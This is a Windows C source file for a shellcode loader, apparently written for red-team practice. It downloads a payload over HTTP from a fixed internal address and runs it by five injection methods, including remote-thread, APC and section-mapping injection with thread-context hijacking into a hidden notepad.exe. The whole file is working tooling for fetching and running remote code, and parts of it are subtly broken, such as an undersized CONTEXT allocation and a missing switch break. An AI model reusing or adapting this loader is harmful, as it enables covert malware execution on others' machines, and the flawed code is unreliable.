#ifndef UNICODE
#define UNICODE
#endif

// Requires cmake:
// target_link_libraries(untitled winhttp)

#include <windows.h>
#include <strsafe.h>
#include <winhttp.h>
#include <winternl.h>

#pragma comment(lib, "winhttp.lib")

typedef NTSTATUS(NTAPI *MyNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN OPTIONAL HANDLE FileHandle
);

typedef NTSTATUS(NTAPI *MyNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* MyNtUnmapViewOfSection)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress OPTIONAL
);

typedef enum _SECTION_INHERIT : DWORD {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

enum InjectionType {
    INJECTION_TYPE_FUNCTION_POINTER,
    INJECTION_TYPE_CREATE_THREAD,
    INJECTION_TYPE_CREATE_REMOTE_THREAD,
    INJECTION_TYPE_QUEUE_USER_APC,
    INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION
};

void dprintf(
        _In_z_ _Printf_format_string_ const wchar_t* format,
        ...
) {
    va_list args;
    va_start(args, format);

    wchar_t buffer[2048];
    StringCchVPrintf(buffer, sizeof(buffer), format, args);
    OutputDebugString(buffer);
    printf("%ls", buffer);

    va_end(args);
}

void printLastError() {
    wchar_t buf[256];
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                   buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
    printf("Error: %ls\n", buf);
}

void dprintfWithLastError(
        _In_z_ _Printf_format_string_ const wchar_t* format,
        ...
) {
    va_list args;
    va_start(args, format);

    wchar_t buffer[2048];
    StringCchVPrintf(buffer, sizeof(buffer), format, args);
    OutputDebugString(buffer);
    printf("%ls\n", buffer);

    va_end(args);

    printLastError();
}

BYTE* download(LPCWSTR host, DWORD port, BOOL useTls, LPCWSTR httpPath, DWORD* dwLength) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BYTE* data = NULL;

    do {
        hSession = WinHttpOpen(
                NULL, // No user agent string
                WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0 // For visual studio 2022 - useTls ? WINHTTP_FLAG_SECURE_DEFAULTS : 0 - If secure (i.e.) port 443 - Require TLS 1.2 by default
        );

        if (!hSession) {
            dprintfWithLastError(L"failed to create session");
            break;
        }

        // Connect
        hConnect = WinHttpConnect(
                hSession,
                host,
                port,
                0 // Reserved, set as 0
        );

        if (!hConnect) {
            dprintfWithLastError(L"failed to connect");
            break;
        }

        // Create request handle
        hRequest = WinHttpOpenRequest(
                hConnect,
                L"GET",
                httpPath,
                NULL, // Use HTTP 1.1
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                useTls ? WINHTTP_FLAG_SECURE : 0 // If secure (i.e. port 443) use WINHTTP_FLAG_SECURE
        );

        if (!hRequest) {
            dprintfWithLastError(L"failed to create request");
            break;
        }

        // Send the request
        if (!WinHttpSendRequest(
                hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, // No headers
                0, // No header length
                WINHTTP_NO_REQUEST_DATA, // No http body
                0, // No optional data
                0, // 0 total length
                0 // No callbacks
        )) {
            dprintfWithLastError(L"failed to send request");
            break;
        }

        if (!WinHttpReceiveResponse(
                hRequest,
                NULL
        )) {
            dprintfWithLastError(L"Failed to receive response");
            break;
        }

        // Read all data
        DWORD dwSize = 0;
        DWORD dwTotalBufferSize = 0;
        DWORD dwReadByteCount = 0;
        do {
            dprintf(L"starting loop %d\n", dwSize);
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                dprintfWithLastError(L"failed to query available data\n");
                break;
            }

            if (dwSize == 0) {
                break;
            }

            dwTotalBufferSize += dwSize;
            dprintf(L"start realloc\n");
            if (data == NULL) {
                data = malloc(dwTotalBufferSize);
                dprintf(L"malloc location: 0x%p\n", data);
            }
            else {
                data = realloc(data, dwTotalBufferSize);
                dprintf(L"realloc location: 0x%p\n", data);
            }

            if (!data) {
                dprintfWithLastError(L"Failed to malloc %d\n", dwTotalBufferSize);
                break;
            }

            RtlZeroMemory(data + dwReadByteCount, dwSize);

            if (!WinHttpReadData(hRequest, data + dwReadByteCount, dwSize, &dwSize)) {
                dprintfWithLastError(L"Failed to read size %d\n", dwTotalBufferSize);
                free(data);
                data = NULL;
                break;
            }
            dwReadByteCount += dwSize;
        } while (dwSize > 0);

        *dwLength = dwReadByteCount;
    } while (0);

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return data;
}

void hexdump(BYTE* value, DWORD length) {
    for (int i = 0; i < length; i++) {
        dprintf(L"0x%02x ", value[i]);
        if ((i + 1) % 8 == 0) {
            dprintf(L"\n");
        }
    }
}

int injectShellcodeFromFunctionPointer(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Mark shellcode as executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(
            shellcode,
            dwShellcodeLength,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
    )) {
        dprintfWithLastError(L"failed to set rwx\n");
        return 1;
    }

    (*(void(*)()) shellcode)();

    return 0;
}

int injectShellcodeFromCreateThread(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Mark shellcode as executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(
            shellcode,
            dwShellcodeLength,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
    )) {
        dprintfWithLastError(L"failed to set rwx\n");
        return 1;
    }

    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
            NULL, // lpThreadAttributes null for default security descriptor
            0, // Stack size - 0 for the default
            (LPTHREAD_START_ROUTINE)shellcode, // lpStartAddress
            NULL, // No parameters
            0, // No creation flags
            &threadId
    );

    if (!hThread) {
        dprintfWithLastError(L"Failed creating thread\n");
        return 1;
    }

    dprintf(L"checking if running threadId=0x%p\n", hThread);

    DWORD exitCode;
    if (!GetExitCodeThread(
            hThread,
            &exitCode
    )) {
        dprintfWithLastError(L"Failed getting exit code\n");
        return 1;
    }

    dprintf(L"Exit code %d\n", exitCode);

    dprintf(L"Waiting for thread\n");
    WaitForSingleObject(hThread, INFINITE);
    if (!CloseHandle(hThread)) {
        dprintfWithLastError(L"Failed closing handle\n");
        return 1;
    }

    dprintf(L"Finished");
    return 0;
}

// Instead of injecting into an existing process, we'll spawn our own process - then create the remote thread
// Creates a thread that isn't backed by a module on disk, which can be a smell
int injectShellcodeWithRemoteThread(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Create the new process - notepad.exe for now, but with CREATE_NO_WINDOW
    wchar_t lpApplicationName[] = L"C:\\Windows\\notepad.exe";
    wchar_t* lpCommandLine = NULL;
    // Inherit
    LPSECURITY_ATTRIBUTES processAttributes = NULL;
    LPSECURITY_ATTRIBUTES threadAttributes = NULL;
    BOOL bInheritHandles = FALSE;
    DWORD dwCreationFlags = CREATE_NO_WINDOW;
    LPVOID lpEnvironment = NULL;

    LPCWSTR lpCurrentDirectory = NULL;
    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION processInformation = { 0 };
    BOOL success;
    success = CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            processAttributes,
            threadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            &startupInfo,
            &processInformation
    );

    if (!success) {
        printf("[x] Failed to create process\n");
        goto error;
    }

    printf("dwProcessId=%ld\n", processInformation.dwProcessId);
    printf("dwThreadId=%ld\n", processInformation.dwThreadId);
    printf("hProcess=0x%p\n",processInformation.hProcess);
    printf("hThread=0x%p\n", processInformation.hThread);

    // Allocate rwx memory in the created process
    LPVOID lpAllocMemory = VirtualAllocEx(
        processInformation.hProcess,
        NULL, // Set address as null to allocate somewhere arbitrary
        dwShellcodeLength,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    dprintf(L"Allocated memory location: 0x%p\n", lpAllocMemory);

    if (!lpAllocMemory) {
        dprintfWithLastError(L"Failed to alloc memory");
        goto error;
    }

    dprintf(L"Writing to target memory");
    SIZE_T dwBytesWritten = 0;
    if (!WriteProcessMemory(
        processInformation.hProcess,
        lpAllocMemory,
        shellcode,
        (SIZE_T) dwShellcodeLength,
        &dwBytesWritten
    )) {
        dprintfWithLastError(L"Failed to write process memory");
        goto error;
    }

    dprintf(L"Wrote total bytes %d\n", dwBytesWritten);

    // Create the thread in the remote process
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateRemoteThread(
        processInformation.hProcess,
        NULL, // Thread attributes - use default security descriptor
        0, // default stack size
        (LPTHREAD_START_ROUTINE) lpAllocMemory, // start our shell code
        NULL, // No thread parameter
        0, // No creation flags
        &dwThreadId
    );

    if(!hThread) {
        dprintfWithLastError(L"Failed to create thread");
        goto error;
    }

    // Wait for child to exit
    //WaitForSingleObject(processInformation.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(hThread);
    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);

    return 0;
error:
    printLastError();

    return 1;
}

// Instead of injecting into an existing process, we'll spawn our own process in a suspended state
// Then inject the shellcode, and then qeueu a call to the shellcode on its primary thread
int injectShellcodeWithQueueUserAPC(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Create the new process - notepad.exe for now, but with CREATE_NO_WINDOW
    wchar_t lpApplicationName[] = L"C:\\Windows\\notepad.exe";
    wchar_t* lpCommandLine = NULL;
    // Inherit
    LPSECURITY_ATTRIBUTES processAttributes = NULL;
    LPSECURITY_ATTRIBUTES threadAttributes = NULL;
    BOOL bInheritHandles = FALSE;
    // CREATE_SUSPENDED is important:
    DWORD dwCreationFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
    LPVOID lpEnvironment = NULL;

    LPCWSTR lpCurrentDirectory = NULL;
    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION processInformation = { 0 };
    BOOL success;
    success = CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            processAttributes,
            threadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            &startupInfo,
            &processInformation
    );

    if (!success) {
        printf("[x] Failed to create process\n");
        goto error;
    }

    printf("dwProcessId=%ld\n", processInformation.dwProcessId);
    printf("dwThreadId=%ld\n", processInformation.dwThreadId);
    printf("hProcess=0x%p\n",processInformation.hProcess);
    printf("hThread=0x%p\n", processInformation.hThread);

    // Allocate rwx memory in the created process
    LPVOID lpAllocMemory = VirtualAllocEx(
            processInformation.hProcess,
            NULL, // Set address as null to allocate somewhere arbitrary
            dwShellcodeLength,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
    );

    dprintf(L"Allocated memory location: 0x%p\n", lpAllocMemory);

    if (!lpAllocMemory) {
        dprintfWithLastError(L"Failed to alloc memory");
        goto error;
    }

    dprintf(L"Writing to target memory");
    SIZE_T dwBytesWritten = 0;
    if (!WriteProcessMemory(
            processInformation.hProcess,
            lpAllocMemory,
            shellcode,
            (SIZE_T) dwShellcodeLength,
            &dwBytesWritten
    )) {
        dprintfWithLastError(L"Failed to write process memory");
        goto error;
    }

    dprintf(L"Wrote total bytes %d\n", dwBytesWritten);

    // Use QueueUserAPC instead of CreateRemoteThrea
    DWORD dwThreadId = 0;
    if(!QueueUserAPC(
            (PAPCFUNC) lpAllocMemory,
            processInformation.hThread,
            0
    )) {
        dprintfWithLastError(L"Failed to run queue user apc");
        goto error;
    }

    // Wait for child to exit
    //WaitForSingleObject(processInformation.hProcess, INFINITE);

    // Resume the process that we originally suspended
    ResumeThread(processInformation.hThread);

    // Close process and thread handles
    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);

    return 0;
    error:
    printLastError();

    return 1;
}

// Instead of injecting into an existing process, we'll spawn our own process in a suspended state
// Then inject the shellcode, and then qeueu a call to the shellcode on its primary thread
// We use NtCreateSection and NtMapViewOfSection as alternaties for VirtualAllocEx and WriteProcessMemory
int injectShellcodeWithNtMapViewOfSection(BYTE* shellcode, DWORD dwShellcodeLength) {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    // Find NtCreateSection - As an alternative to VirtualAllocEx
    FARPROC hNtCreateSection = GetProcAddress(hNtdll, "NtCreateSection");
    MyNtCreateSection myNtCreateSection = (MyNtCreateSection) hNtCreateSection;

    // Find NtMapViewOfSection
    FARPROC hNtMapViewOfSection = GetProcAddress(hNtdll, "NtMapViewOfSection");
    MyNtMapViewOfSection myNtMapViewOfSection = (MyNtMapViewOfSection) hNtMapViewOfSection;

    // Find NtUnmapViewOfSection
    FARPROC hNtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    MyNtUnmapViewOfSection myNtUnmapViewOfSection = (MyNtUnmapViewOfSection) hNtUnmapViewOfSection;

    // Create the new process - notepad.exe for now, but with CREATE_NO_WINDOW
    wchar_t lpApplicationName[] = L"C:\\Windows\\notepad.exe";
    wchar_t* lpCommandLine = NULL;
    // Inherit
    LPSECURITY_ATTRIBUTES processAttributes = NULL;
    LPSECURITY_ATTRIBUTES threadAttributes = NULL;
    BOOL bInheritHandles = FALSE;
    // CREATE_SUSPENDED is important:
    DWORD dwCreationFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
    LPVOID lpEnvironment = NULL;

    LPCWSTR lpCurrentDirectory = NULL;
    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION processInformation = { 0 };
    BOOL success;
    success = CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            processAttributes,
            threadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            &startupInfo,
            &processInformation
    );

    if (!success) {
        printf("[x] Failed to create process\n");
        goto error;
    }

    printf("dwProcessId=%ld\n", processInformation.dwProcessId);
    printf("dwThreadId=%ld\n", processInformation.dwThreadId);
    printf("hProcess=0x%p\n",processInformation.hProcess);
    printf("hThread=0x%p\n", processInformation.hThread);

    // Create a section in the local process
    HANDLE hSection = NULL;
    LARGE_INTEGER szSection = { dwShellcodeLength };

    NTSTATUS status = myNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL, // Default object attributes
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL // FileHandle, NULL - backed by the paging file
    );

    if(!NT_SUCCESS(status)) {
        dprintf(L"Failed creating section\n");
        goto error;
    }

    // Map the sectoin into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = myNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        0, // ZeroBits - Not used, as hLocalAddress is null
        0, // Commit size
        NULL, // SectionOffset
        &viewSize, // Store the created view size
        ViewShare, // The view will be mapped into any child processes created in the future
        0, // Allocation type
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        dprintfWithLastError(L"Failed to map view of section to local process");
        goto error;
    }

    dprintf(L"Allocated memory location: 0x%p\n", hLocalAddress);

    // Copy the shellcode into the local memory location
    RtlCopyMemory(hLocalAddress, shellcode, dwShellcodeLength);

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = myNtMapViewOfSection(
        hSection,
        processInformation.hProcess,
        &hRemoteAddress,
        0, // ZeroBits - Not used, as hLocalAddress is null
        0, // Commit size
        NULL, // SectionOffset
        &viewSize, // Store the created view size
        ViewShare, // The view will be mapped into any child processes created in the future
        0, // Allocation type
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        dprintfWithLastError(L"Failed to map view of section to local process");
        goto error;
    }

    // Get context of main thread
    LPCONTEXT pContext = (LPCONTEXT) malloc(sizeof(LPCONTEXT));
    //RtlZeroMemory(pContext, sizeof(CONTEXT));
    pContext->ContextFlags = CONTEXT_INTEGER;
    if(!GetThreadContext(processInformation.hThread, pContext)) {
        dprintfWithLastError(L"Failed to get thread context");
        goto error;
    }

    // Update rcx context - which is the virtual address of entry point
    pContext->Rcx = (DWORD64) hRemoteAddress;
    SetThreadContext(processInformation.hThread, pContext);

    // Resume the process that we originally suspended
    ResumeThread(processInformation.hThread);

    // Unnmap memory from local process
    status = hNtUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress
    );

    if (!NT_SUCCESS(status)) {
        dprintfWithLastError(L"Failed to unmap view of section to local process");
        goto error;
    }

    // Close process and thread handles seems to crash on program exit
    //if (pContext) {
    //    free(pContext);
    //}
    //CloseHandle(processInformation.hProcess);
    //CloseHandle(processInformation.hThread);
    return 0;
error:
    printLastError();

    return 1;
}

int main() {
    DWORD dwShellcodeLength = 0;
    BOOL useTls = FALSE;
    BYTE* shellcode = download(L"10.10.10.11", 8000, useTls, L"/shellcode.bin", &dwShellcodeLength);
    if (!shellcode) {
        dprintf(L"failed downloading shellcode\n");
        return 1;
    }

    dprintf(L"shellcode location: %p\n", shellcode);
    //hexdump(shellcode, dwShellcodeLength);

    enum InjectionType injectionType = INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION;

    switch (injectionType) {
        case INJECTION_TYPE_FUNCTION_POINTER: {
            injectShellcodeFromFunctionPointer(shellcode, dwShellcodeLength);
        }
        case INJECTION_TYPE_CREATE_THREAD: {
            injectShellcodeFromCreateThread(shellcode, dwShellcodeLength);
            break;
        }
        case INJECTION_TYPE_CREATE_REMOTE_THREAD: {
            injectShellcodeWithRemoteThread(shellcode, dwShellcodeLength);
            break;
        }
        case INJECTION_TYPE_QUEUE_USER_APC: {
            injectShellcodeWithQueueUserAPC(shellcode, dwShellcodeLength);
            break;
        }
        case INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION: {
            injectShellcodeWithNtMapViewOfSection(shellcode, dwShellcodeLength);
            break;
        }
        default:
            dprintf(L"Unknown injection type");
            break;
    }

    return 0;
}
